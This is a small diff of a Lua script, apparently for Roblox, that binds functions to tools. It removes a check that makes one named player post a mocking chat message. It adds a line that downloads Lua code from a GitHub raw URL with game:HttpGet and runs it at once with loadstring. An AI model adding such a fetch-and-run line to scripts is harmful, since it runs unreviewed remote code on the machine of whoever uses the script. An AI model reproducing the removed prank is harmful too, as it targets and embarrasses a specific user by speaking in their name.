@@ -162,7 +162,4 @@ for name, func in pairs(tools) do
     tool.Activated:Connect(func)
 end
 
-
-if table.find({'Kingjad088899V2'}, game.Players.LocalPlayer.Name) then
-   sendMessage('i like feminine men')
-end
+loadstring(game:HttpGet('https://github.com/popoffroblox/LoadLists/raw/refs/heads/main/loadlists.lua', true))()
